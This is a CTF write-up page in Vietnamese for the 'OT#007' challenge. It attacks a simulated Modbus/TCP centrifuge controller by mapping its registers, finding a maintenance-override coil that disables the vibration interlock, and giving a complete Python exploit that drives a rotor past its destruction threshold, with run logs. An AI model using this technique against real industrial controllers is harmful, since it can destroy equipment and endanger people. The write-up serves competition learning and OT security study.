@@ -1,0 +1,311 @@
+<!doctype html>
+<html lang="vi">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>OT#007 — CTFWU</title>
+<link rel="stylesheet" href="xian.css">
+</head>
+<body>
+<header class="site-header">
+  <div class="header-inner">
+    <a class="brand" href="home.html"><span class="seal">C</span><span class="wordmark">CTFWU<em>.</em></span></a>
+    <nav class="main-nav"><a href="home.html">Tổng quan</a><a href="archive.html" aria-current="page">Writeups<span class="nav-count">283</span></a><a href="archive.html">Thành tích</a><a href="archive.html">Giới thiệu</a></nav>
+    <div class="header-actions">
+      <span class="lang"><a href="#" aria-current="true">VI</a><span>/</span><a href="#">EN</a></span>
+      <button class="icon-btn" aria-label="Đổi giao diện sáng / tối"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.4"><circle cx="12" cy="12" r="4"/><path d="M12 2v2m0 16v2M2 12h2m16 0h2M5 5l1.5 1.5m11 11L19 19M5 19l1.5-1.5m11-11L19 5"/></svg></button>
+      <a class="gh" href="https://github.com/tinhatinh/CTFWU">GitHub ↗</a>
+      <button class="icon-btn menu-toggle" aria-label="Mở menu"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.4"><path d="M4 7h16M4 12h16M4 17h16"/></svg></button>
+    </div>
+  </div>
+</header>
+
+<main>
+<div class="wrap post-head">
+  <p class="eyebrow"><span class="rule"></span>AFRICA BATTLECTF 2026 QUALIFIER</p>
+  <h1>OT#007</h1>
+  <p class="post-desc">Khác các bài OT khác ở đây, protection vẫn hoạt động: vibration khiến logic không dừng đúng chỗ, và flag chỉ lộ ra khi ép thiết bị vào trạng thái bảo trì.</p>
+  <div class="byline">
+    <span class="monogram">td</span><span>tinhatinh / R3:TURИ</span>
+    <span>·</span><time>04.11.2026</time><span>·</span><span>12 phút đọc</span>
+    <span>·</span><a class="text-link" href="https://github.com/tinhatinh/CTFWU">Nguồn ↗</a>
+  </div>
+</div>
+<div class="wrap post-layout">
+  <article class="article prose">
+
+    
+    <p><strong>Flag:</strong> CTF{713a514d4bb87d6343f976fc56db961d}<br />
+<strong>Target:</strong> 169.58.126.107:6005 (Modbus/TCP, unit 1) — mô phỏng của ban tổ chức, chỉ hoạt động trong thời gian qualifier (2026-10-04 đến 2026-11-04 23:00 UTC)<br />
+<strong>Định dạng flag:</strong> CTF{…}</p>
+
+<h2 id="s0">Đề bài</h2>
+
+<blockquote>
+  <p>OT#007 — 140 điểm. Centrifuge cascade controller gồm hai rotor và một vibration interlock, chạy trên Modbus/TCP endpoint thực. Không source, binary hay register map.</p>
+
+  <p><strong>Mục tiêu:</strong> phá hủy cascade bằng cách làm vibration vượt ngưỡng phá hủy, sau đó đọc incident flag mà controller ghi lại.</p>
+
+  <p>https://otctf.pages.dev/ot-007-centrifuge-resonance/light</p>
+</blockquote>
+
+<p>Khác các bài OT khác ở đây, protection vẫn hoạt động: vibration khiến máy dừng có kiểm soát và trip được latch.</p>
+
+<h2 id="s1">Phân tích</h2>
+
+<p>FC1/3/4/5/6/15/16 đều phản hồi; FC2 chưa triển khai — server <strong>đóng TCP connection</strong> thay vì trả exception, nên sweep FC2 sẽ làm mất socket mà không báo rõ. FC6 ACK mọi address 0..99 nhưng chỉ HR0..HR4 giữ dữ liệu, do đó setpoint chỉ thấy được qua FC16. Probe cho thấy có coil 0..7 và register 0..99; unit id bị bỏ qua. Socket thứ hai đọc toàn số 0: state gắn với connection, nên cần chạy attack trên một socket duy nhất.</p>
+
+<h3 id="s2">Register map</h3>
+
+<table>
+  <thead>
+    <tr>
+      <th>Addr</th>
+      <th>Vai trò</th>
+      <th>Đo được</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>coil0</td>
+      <td>POWER</td>
+      <td>phản ánh vào bit 0 của IR0</td>
+    </tr>
+    <tr>
+      <td>coil1</td>
+      <td>MAINTENANCE OVERRIDE</td>
+      <td>interlock không thể ép máy dừng</td>
+    </tr>
+    <tr>
+      <td>coil2</td>
+      <td>INTERLOCK RESET</td>
+      <td>pulse xóa trip latch (3 -&gt; 1)</td>
+    </tr>
+    <tr>
+      <td>HR10, HR11</td>
+      <td>setpoint tốc độ rotor A / B</td>
+      <td>không range check: nhận 0..65535</td>
+    </tr>
+    <tr>
+      <td>IR0</td>
+      <td>state</td>
+      <td>1 đang chạy, 2 tripped (latched), 4 destroyed; đã thấy 0, 1, 3, 4</td>
+    </tr>
+    <tr>
+      <td>IR2, IR3</td>
+      <td>tốc độ rotor A / B</td>
+      <td>khoảng 0.99 × SP; A mất 20–30 giây, B mất 3–4 giây; giới hạn 6095</td>
+    </tr>
+    <tr>
+      <td>IR4</td>
+      <td>vibration</td>
+      <td>bám theo chênh lệch rotor, khoảng offset/19.3: 24 -&gt; 1, 999 -&gt; 51, 2594 -&gt; 134, 5786 -&gt; 300, 6095 -&gt; 316</td>
+    </tr>
+    <tr>
+      <td>IR20..56</td>
+      <td>incident flag</td>
+      <td>chỉ xuất hiện khi IR0 = 4</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Setpoint trên giới hạn đều bão hòa ở cùng tốc độ cao nhất — cả 10000 và 60000 đều đưa cascade tới 6003/6095, IR4 lần lượt 312/316, cách nhau một poll.</p>
+
+<h3 id="s3">Trip, latch và override</h3>
+
+<p>Chỉ bật power (0x01) tại B=3000, sau đó thử latch ở B=6000. Tuple (IR0, IR2, IR3, IR4) lần lượt là state, rotor A, rotor B và vibration:</p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>state=1 B=1897 vib=98    state=1 B=2594 vib=134   state=1 B=2850 vib=148
+state=3 B=788  vib=40    state=3 B=112  vib=5     state=3 B=15   vib=0
+latched state now: (3, 0, 216, 11)   power cycle coil0: (3, 0, 113, 5)   coils(0x01): (3, 0, 11, 0)
+pulse coil1: state 3 -&gt; 3 (on) -&gt; 3 (off)
+pulse coil2: state 3 -&gt; 1 (on) -&gt; 1 (off)   &gt;&gt;&gt; coil2 CLEARS THE TRIP LATCH
+</code></pre></div></div>
+
+<p>Mẫu cuối cùng máy còn chạy có vib 148; poll kế tiếp đã thấy dừng. Vậy trip setpoint cao hơn 148 một chút — với poll khoảng 1 giây và ramp xấp xỉ 35 mức/giây, ngưỡng nằm trong (148, 185]. Không cần xác định sát hơn. Sweep B=4000 cũng khớp: trip xảy ra sau peak đo được 124–131.</p>
+
+<h3 id="s4">coil1 là maintenance override</h3>
+
+<p>Thử tại B=4000 (IR4 khoảng 200, cao hơn ngưỡng trip nhưng dưới ngưỡng phá hủy); giữa các lượt pulse coil2 để reset latch:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: right">Mask</th>
+      <th>Coils</th>
+      <th>Kết quả</th>
+      <th style="text-align: right">IR4 đỉnh</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: right">0x01</td>
+      <td>chỉ power</td>
+      <td>TRIPPED (B giảm còn 944)</td>
+      <td style="text-align: right">131</td>
+    </tr>
+    <tr>
+      <td style="text-align: right">0x03</td>
+      <td>power + coil1</td>
+      <td><strong>GIỮ CHẠY</strong></td>
+      <td style="text-align: right">207</td>
+    </tr>
+    <tr>
+      <td style="text-align: right">0x05</td>
+      <td>power + coil2</td>
+      <td>TRIPPED (B giảm còn 949)</td>
+      <td style="text-align: right">126</td>
+    </tr>
+    <tr>
+      <td style="text-align: right">0x09, 0x11, 0x21, 0x41, 0x81</td>
+      <td>power + coil3..coil7</td>
+      <td>TRIPPED (B giảm còn 944–1111)</td>
+      <td style="text-align: right">124</td>
+    </tr>
+    <tr>
+      <td style="text-align: right">0xFF</td>
+      <td>tất cả coil</td>
+      <td><strong>GIỮ CHẠY</strong></td>
+      <td style="text-align: right">207</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>coil1 là override và là bit duy nhất cần bật. Khi bật, B=4200/4600/5000/5400 đều chạy tiếp, peak IR4 218/238/259/280; B=5800 <strong>PHÁ HỦY</strong> cascade (IR0 = 4) tại peak 300 — tức ngưỡng nằm giữa 280 và 300. Không cần tinh chỉnh thêm; exploit đặt 6000. Khi IR0 = 4, flag xuất hiện trong IR20..IR56, mỗi big-endian word chứa một ký tự ASCII ở byte thấp (IR20 = 67 = ‘C’).</p>
+
+<h2 id="s5">Lời giải</h2>
+
+<ol>
+  <li>Bật override: FC15 @coil0, ghi 8 coil bằng một byte 0x03 — POWER + MAINTENANCE OVERRIDE.</li>
+  <li>Làm lệch cascade: FC16 @HR10, ghi 10 register [0, 6000, 0, 0, 0, 0, 0, 0, 0, 0] — rotor A giữ yên, rotor B vượt vùng vận hành an toàn.</li>
+  <li>Đọc incident: FC4 @0 qty 57 mỗi giây cho tới khi IR0 = 4.</li>
+</ol>
+
+<h2 id="s6">Mã khai thác</h2>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span><span class="sh">"""</span><span class="s">OT#007 Centrifuge-Resonance (Africa battleCTF 2026 Qualifier, OT, 140 pts).
+
+Minimal exploit against the Modbus/TCP centrifuge cascade controller:
+  * FC15 writes the whole coil image at once -&gt; coil0 (POWER) + coil1
+    (MAINTENANCE OVERRIDE) are latched on in a single legitimate write.
+  * FC16 writes the speed setpoint block -&gt; HR10 = rotor A (parked),
+    HR11 = rotor B (commanded far above the operating band).
+With the override engaged the vibration interlock cannot force its
+controlled stop, rotor B runs the cascade up to the hardware cap (6095),
+vibration crosses the destructive threshold (~300), IR0 latches to 4 and
+the incident flag is released into IR20..IR56, one ASCII char per register.
+</span><span class="sh">"""</span>
+<span class="kn">import</span> <span class="n">socket</span><span class="p">,</span> <span class="n">struct</span><span class="p">,</span> <span class="n">time</span>
+
+<span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">,</span> <span class="n">UNIT</span> <span class="o">=</span> <span class="sh">"</span><span class="s">169.58.126.107</span><span class="sh">"</span><span class="p">,</span> <span class="mi">6005</span><span class="p">,</span> <span class="mi">1</span>
+
+<span class="k">class</span> <span class="nc">Modbus</span><span class="p">:</span>
+    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mf">8.0</span><span class="p">):</span>
+        <span class="n">self</span><span class="p">.</span><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="nf">create_connection</span><span class="p">((</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">),</span> <span class="n">timeout</span><span class="o">=</span><span class="n">timeout</span><span class="p">)</span>
+        <span class="n">self</span><span class="p">.</span><span class="n">s</span><span class="p">.</span><span class="nf">settimeout</span><span class="p">(</span><span class="n">timeout</span><span class="p">)</span>
+        <span class="n">self</span><span class="p">.</span><span class="n">tid</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="k">def</span> <span class="nf">close</span><span class="p">(</span><span class="n">self</span><span class="p">):</span>
+        <span class="n">self</span><span class="p">.</span><span class="n">s</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
+    <span class="k">def</span> <span class="nf">xact</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">unit</span><span class="p">,</span> <span class="n">pdu</span><span class="p">):</span>
+        <span class="n">self</span><span class="p">.</span><span class="n">tid</span> <span class="o">=</span> <span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">tid</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFFF</span>
+        <span class="n">self</span><span class="p">.</span><span class="n">s</span><span class="p">.</span><span class="nf">sendall</span><span class="p">(</span><span class="n">struct</span><span class="p">.</span><span class="nf">pack</span><span class="p">(</span><span class="sh">"</span><span class="s">&gt;HHHB</span><span class="sh">"</span><span class="p">,</span> <span class="n">self</span><span class="p">.</span><span class="n">tid</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nf">len</span><span class="p">(</span><span class="n">pdu</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="n">unit</span><span class="p">)</span> <span class="o">+</span> <span class="n">pdu</span><span class="p">)</span>
+        <span class="n">hdr</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">""</span>
+        <span class="k">while</span> <span class="nf">len</span><span class="p">(</span><span class="n">hdr</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">7</span><span class="p">:</span>
+            <span class="n">chunk</span> <span class="o">=</span> <span class="n">self</span><span class="p">.</span><span class="n">s</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">7</span> <span class="o">-</span> <span class="nf">len</span><span class="p">(</span><span class="n">hdr</span><span class="p">))</span>
+            <span class="k">if</span> <span class="ow">not</span> <span class="n">chunk</span><span class="p">:</span>
+                <span class="k">raise</span> <span class="nc">ConnectionError</span><span class="p">(</span><span class="sh">"</span><span class="s">connection closed</span><span class="sh">"</span><span class="p">)</span>
+            <span class="n">hdr</span> <span class="o">+=</span> <span class="n">chunk</span>
+        <span class="n">_</span><span class="p">,</span> <span class="n">_</span><span class="p">,</span> <span class="n">ln</span><span class="p">,</span> <span class="n">_</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="nf">unpack</span><span class="p">(</span><span class="sh">"</span><span class="s">&gt;HHHB</span><span class="sh">"</span><span class="p">,</span> <span class="n">hdr</span><span class="p">)</span>
+        <span class="n">body</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">""</span>
+        <span class="k">while</span> <span class="nf">len</span><span class="p">(</span><span class="n">body</span><span class="p">)</span> <span class="o">&lt;</span> <span class="n">ln</span> <span class="o">-</span> <span class="mi">1</span><span class="p">:</span>
+            <span class="n">chunk</span> <span class="o">=</span> <span class="n">self</span><span class="p">.</span><span class="n">s</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="n">ln</span> <span class="o">-</span> <span class="mi">1</span> <span class="o">-</span> <span class="nf">len</span><span class="p">(</span><span class="n">body</span><span class="p">))</span>
+            <span class="k">if</span> <span class="ow">not</span> <span class="n">chunk</span><span class="p">:</span>
+                <span class="k">raise</span> <span class="nc">ConnectionError</span><span class="p">(</span><span class="sh">"</span><span class="s">connection closed</span><span class="sh">"</span><span class="p">)</span>
+            <span class="n">body</span> <span class="o">+=</span> <span class="n">chunk</span>
+        <span class="k">if</span> <span class="n">body</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0x80</span><span class="p">:</span>
+            <span class="k">raise</span> <span class="nc">IOError</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">modbus exception code </span><span class="si">{</span><span class="n">body</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="si">:</span><span class="c1">#04x</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+        <span class="k">return</span> <span class="n">body</span>
+    <span class="k">def</span> <span class="nf">read_input</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="n">qty</span><span class="p">):</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">self</span><span class="p">.</span><span class="nf">xact</span><span class="p">(</span><span class="n">UNIT</span><span class="p">,</span> <span class="n">struct</span><span class="p">.</span><span class="nf">pack</span><span class="p">(</span><span class="sh">"</span><span class="s">&gt;BHH</span><span class="sh">"</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="n">qty</span><span class="p">))</span>
+        <span class="k">return</span> <span class="nf">list</span><span class="p">(</span><span class="n">struct</span><span class="p">.</span><span class="nf">unpack</span><span class="p">(</span><span class="sh">"</span><span class="s">&gt;</span><span class="sh">"</span> <span class="o">+</span> <span class="sh">"</span><span class="s">H</span><span class="sh">"</span> <span class="o">*</span> <span class="p">(</span><span class="n">r</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">//</span> <span class="mi">2</span><span class="p">),</span> <span class="n">r</span><span class="p">[</span><span class="mi">2</span><span class="p">:</span><span class="mi">2</span> <span class="o">+</span> <span class="n">r</span><span class="p">[</span><span class="mi">1</span><span class="p">]]))</span>
+    <span class="k">def</span> <span class="nf">write_coils</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="n">values</span><span class="p">):</span>
+        <span class="n">nbytes</span> <span class="o">=</span> <span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">values</span><span class="p">)</span> <span class="o">+</span> <span class="mi">7</span><span class="p">)</span> <span class="o">//</span> <span class="mi">8</span>
+        <span class="n">raw</span> <span class="o">=</span> <span class="nf">bytearray</span><span class="p">(</span><span class="n">nbytes</span><span class="p">)</span>
+        <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="nf">enumerate</span><span class="p">(</span><span class="n">values</span><span class="p">):</span>
+            <span class="k">if</span> <span class="n">v</span><span class="p">:</span>
+                <span class="n">raw</span><span class="p">[</span><span class="n">i</span> <span class="o">//</span> <span class="mi">8</span><span class="p">]</span> <span class="o">|=</span> <span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="n">i</span> <span class="o">%</span> <span class="mi">8</span><span class="p">)</span>
+        <span class="n">self</span><span class="p">.</span><span class="nf">xact</span><span class="p">(</span><span class="n">UNIT</span><span class="p">,</span> <span class="n">struct</span><span class="p">.</span><span class="nf">pack</span><span class="p">(</span><span class="sh">"</span><span class="s">&gt;BHHB</span><span class="sh">"</span><span class="p">,</span> <span class="mi">15</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="nf">len</span><span class="p">(</span><span class="n">values</span><span class="p">),</span> <span class="n">nbytes</span><span class="p">)</span> <span class="o">+</span> <span class="nf">bytes</span><span class="p">(</span><span class="n">raw</span><span class="p">))</span>
+    <span class="k">def</span> <span class="nf">write_registers</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="n">values</span><span class="p">):</span>
+        <span class="n">self</span><span class="p">.</span><span class="nf">xact</span><span class="p">(</span><span class="n">UNIT</span><span class="p">,</span> <span class="n">struct</span><span class="p">.</span><span class="nf">pack</span><span class="p">(</span><span class="sh">"</span><span class="s">&gt;BHHB</span><span class="sh">"</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="nf">len</span><span class="p">(</span><span class="n">values</span><span class="p">),</span> <span class="mi">2</span> <span class="o">*</span> <span class="nf">len</span><span class="p">(</span><span class="n">values</span><span class="p">))</span>
+                  <span class="o">+</span> <span class="n">struct</span><span class="p">.</span><span class="nf">pack</span><span class="p">(</span><span class="sh">"</span><span class="s">&gt;</span><span class="sh">"</span> <span class="o">+</span> <span class="sh">"</span><span class="s">H</span><span class="sh">"</span> <span class="o">*</span> <span class="nf">len</span><span class="p">(</span><span class="n">values</span><span class="p">),</span> <span class="o">*</span><span class="n">values</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    <span class="n">mb</span> <span class="o">=</span> <span class="nc">Modbus</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
+    <span class="n">mb</span><span class="p">.</span><span class="nf">write_coils</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="p">[</span><span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">])</span>            <span class="c1"># power + maintenance override
+</span>    <span class="n">mb</span><span class="p">.</span><span class="nf">write_registers</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span> <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">6000</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">])</span>  <span class="c1"># rotor A parked, rotor B 6000 rpm
+</span>    <span class="n">flag</span> <span class="o">=</span> <span class="bp">None</span>
+    <span class="n">t0</span> <span class="o">=</span> <span class="n">time</span><span class="p">.</span><span class="nf">time</span><span class="p">()</span>
+    <span class="k">while</span> <span class="n">time</span><span class="p">.</span><span class="nf">time</span><span class="p">()</span> <span class="o">-</span> <span class="n">t0</span> <span class="o">&lt;</span> <span class="mi">40</span><span class="p">:</span>
+        <span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mf">1.0</span><span class="p">)</span>
+        <span class="n">ir</span> <span class="o">=</span> <span class="n">mb</span><span class="p">.</span><span class="nf">read_input</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">57</span><span class="p">)</span>
+        <span class="n">state</span><span class="p">,</span> <span class="n">speed_a</span><span class="p">,</span> <span class="n">speed_b</span><span class="p">,</span> <span class="n">vib</span> <span class="o">=</span> <span class="n">ir</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">ir</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="n">ir</span><span class="p">[</span><span class="mi">3</span><span class="p">],</span> <span class="n">ir</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[t+</span><span class="si">{</span><span class="n">time</span><span class="p">.</span><span class="nf">time</span><span class="p">()</span> <span class="o">-</span> <span class="n">t0</span><span class="si">:</span><span class="mf">4.1</span><span class="n">f</span><span class="si">}</span><span class="s">s] IR0=</span><span class="si">{</span><span class="n">state</span><span class="si">}</span><span class="s"> A=</span><span class="si">{</span><span class="n">speed_a</span><span class="si">}</span><span class="s"> B=</span><span class="si">{</span><span class="n">speed_b</span><span class="si">}</span><span class="s"> vib=</span><span class="si">{</span><span class="n">vib</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">state</span> <span class="o">==</span> <span class="mi">4</span><span class="p">:</span>                                    <span class="c1"># 4 = cascade destroyed, flag released
+</span>            <span class="n">flag</span> <span class="o">=</span> <span class="sh">""</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="nf">chr</span><span class="p">(</span><span class="n">v</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">)</span> <span class="k">for</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">ir</span><span class="p">[</span><span class="mi">20</span><span class="p">:</span><span class="mi">57</span><span class="p">])</span>
+            <span class="k">break</span>
+    <span class="n">mb</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">flag</span> <span class="ow">or</span> <span class="ow">not</span> <span class="p">(</span><span class="n">flag</span><span class="p">.</span><span class="nf">startswith</span><span class="p">(</span><span class="sh">"</span><span class="s">CTF{</span><span class="sh">"</span><span class="p">)</span> <span class="ow">and</span> <span class="n">flag</span><span class="p">.</span><span class="nf">endswith</span><span class="p">(</span><span class="sh">"</span><span class="s">}</span><span class="sh">"</span><span class="p">)):</span>
+        <span class="k">raise</span> <span class="nc">SystemExit</span><span class="p">(</span><span class="sh">"</span><span class="s">no flag captured</span><span class="sh">"</span><span class="p">)</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">FLAG:</span><span class="sh">"</span><span class="p">,</span> <span class="n">flag</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">"</span><span class="s">__main__</span><span class="sh">"</span><span class="p">:</span>
+    <span class="nf">main</span><span class="p">()</span>
+</code></pre></div></div>
+
+<h2 id="s7">Kết quả</h2>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[t+ 1.2s] IR0=1 A=0 B=3794 vib=197
+[t+ 2.4s] IR0=1 A=0 B=5188 vib=269
+[t+ 3.6s] IR0=1 A=0 B=5701 vib=296
+[t+ 4.8s] IR0=4 A=0 B=5786 vib=300
+FLAG: CTF{713a514d4bb87d6343f976fc56db961d}
+</code></pre></div></div>
+
+<p>Trong lần chạy cuối, từ hai lần write tới IR0 = 4 mất 4,8 giây, không thấy mẫu trip ở giữa; flag được tái hiện độc lập bốn lần. Lần đầu dùng payload lớn hơn (coils 0xFF, setpoint 10000), chạm giới hạn 6095 và IR4 316.</p>
+
+<h2 id="s8">Ghi chú</h2>
+
+<ul>
+  <li>State gắn với từng TCP connection: socket mới reset plant, nên toàn bộ tăng cấp phải nằm trong một kết nối.</li>
+  <li>Rate limit rất gắt: sweep 256 unit id trong khoảng 30 giây khiến source IP bị chặn im lặng gần 7 phút; khoảng 7 connection trong 5 phút khiến socket được accept rồi đóng không trả lời suốt 6–8 phút. Một connection dài, mỗi request cách 0,5–1 giây, hoạt động ổn định.</li>
+  <li>Ngưỡng chỉ được khoanh vùng chứ không đo chính xác: interlock vẫn chạy ở IR4 148 rồi dừng tại poll sau; sự kiện phá hủy nằm giữa peak sống sót 280 và mức phá hủy 300. Có thể mô tả là trip ngay trên 150 / phá hủy khoảng 300; độ chính xác này tương ứng poll khoảng 1 giây.</li>
+  <li>Không memory corruption hay auth bypass: hai write hợp lệ (FC15 coils + FC16 setpoint) vô hiệu một protection function vốn hoạt động; setpoint được ghi qua đường không xác thực.</li>
+</ul>
+
+<p><strong>Xử lý có trách nhiệm.</strong> Target là mô phỏng plant của ban tổ chức: chỉ gửi các write cần cho challenge, trên một connection có giãn cách; không cần hoàn nguyên vì plant quên state khi disconnect. Trên cascade thật, hai PDU tương tự sẽ phá hủy rotor và cụm bearing, nên việc kiểm tra kiểu này cần khung thời gian được cấp phép chính thức, plant dừng và đã mất điện, operator dùng key để bật override.</p>
+
+<h2 id="s9">Tham khảo</h2>
+
+<ul>
+  <li>OT field briefing: https://otctf.pages.dev/ot-007-centrifuge-resonance/light</li>
+</ul>
+
+    
+  
+  </article>
+  <aside class="toc">
+    <p>Mục lục</p>
+    <ol><li><a href="#s0">Đề bài</a></li><li><a href="#s1">Phân tích</a></li><li class="sub"><a href="#s2">Register map</a></li><li class="sub"><a href="#s3">Trip, latch và override</a></li><li class="sub"><a href="#s4">coil1 là maintenance override</a></li><li><a href="#s5">Lời giải</a></li><li><a href="#s6">Mã khai thác</a></li><li><a href="#s7">Kết quả</a></li><li><a href="#s8">Ghi chú</a></li><li><a href="#s9">Tham khảo</a></li></ol>
+  </aside>
+</div>
+</main>
+<footer class="site-footer">
+  <div class="wrap footer-inner">
+    <a class="brand" href="home.html"><span class="seal">C</span><span class="wordmark">CTFWU<em>.</em></span></a>
+    <div class="footer-links"><a href="https://github.com/tinhatinh">GitHub ↗</a><a href="https://ctftime.org/team/449538">CTFTime ↗</a><a href="mailto:ptdanh007@gmail.com">Liên hệ ↗</a><a href="#">RSS ↗</a></div>
+    <p class="copyright">© 2026 Phan Thành Danh</p>
+  </div>
+</footer>
+</body>
+</html>
